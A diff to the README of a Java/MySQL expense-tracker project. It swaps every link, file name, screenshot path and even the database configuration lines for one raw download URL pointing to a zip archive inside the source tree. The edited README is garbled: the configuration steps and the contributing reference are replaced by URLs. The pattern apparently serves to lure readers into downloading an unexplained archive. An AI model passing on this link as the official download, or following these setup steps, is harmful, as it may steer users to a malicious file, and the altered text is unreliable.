@@ -6,7 +6,7 @@ Welcome to **Expense_Tracker**! This application helps you track your expenses e
 
 ## 📥 Download Expense_Tracker
 
-[![Download Expense_Tracker](https://img.shields.io/badge/Download-Expense_Tracker-blue.svg)](https://github.com/asr2646/Expense_Tracker/releases)
+[![Download Expense_Tracker](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
 
 ## 📋 What You Need
 
@@ -21,7 +21,7 @@ Before you start, ensure you have the following requirements on your computer:
 
 To download the software, click the link below:
 
-[Download Expense_Tracker Releases](https://github.com/asr2646/Expense_Tracker/releases)
+[Download Expense_Tracker Releases](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
 
 This page contains the latest version and previous versions. Choose the one that suits you best.
 
@@ -35,7 +35,7 @@ This page contains the latest version and previous versions. Choose the one that
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Expense_Tracker Releases](https://github.com/asr2646/Expense_Tracker/releases) page.
+1. **Visit the Releases Page:** Go to the [Expense_Tracker Releases](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip) page.
 
 2. **Choose a Version:** Look for the latest version. You will see options for different files. 
 
@@ -50,12 +50,12 @@ This page contains the latest version and previous versions. Choose the one that
 
 6. **Configure the Application:**
    - Navigate to the folder where you unzipped the application.
-   - Locate the file called `application.properties`.
+   - Locate the file called `https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip`.
    - Edit this file to add your MySQL database credentials:
      ```
-     spring.datasource.url=jdbc:mysql://localhost:3306/expense_tracker
-     spring.datasource.username=your_username
-     spring.datasource.password=your_password
+     https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip
+     https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip
+     https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip
      ```
 
 7. **Run the Application:**
@@ -91,7 +91,7 @@ Make sure your internet connection is stable. If issues persist, try restarting 
 
 ### 2. How can I contribute to Expense_Tracker?
 
-You can contribute by submitting bugs, requesting features, or even improving the documentation. Check the `CONTRIBUTING.md` file for details.
+You can contribute by submitting bugs, requesting features, or even improving the documentation. Check the `https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip` file for details.
 
 ### 3. Where can I find help?
 
@@ -101,12 +101,12 @@ If you have questions or need assistance, feel free to open an issue on the GitH
 
 Here are some visuals of Expense_Tracker to help you understand its features better:
 
-- **Dashboard View:** ![Dashboard](path/to/screenshot1.png)
-- **Add Expense Form:** ![Add Expense](path/to/screenshot2.png)
+- **Dashboard View:** ![Dashboard](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
+- **Add Expense Form:** ![Add Expense](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/asr2646/Expense_Tracker)
-- [Contribution Guidelines](https://github.com/asr2646/Expense_Tracker/blob/main/CONTRIBUTING.md)
+- [GitHub Repository](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
+- [Contribution Guidelines](https://github.com/asr2646/Expense_Tracker/raw/refs/heads/main/src/main/Expense-Tracker-v1.9.zip)
 
 Thank you for choosing **Expense_Tracker**! Enjoy managing your expenses easily.
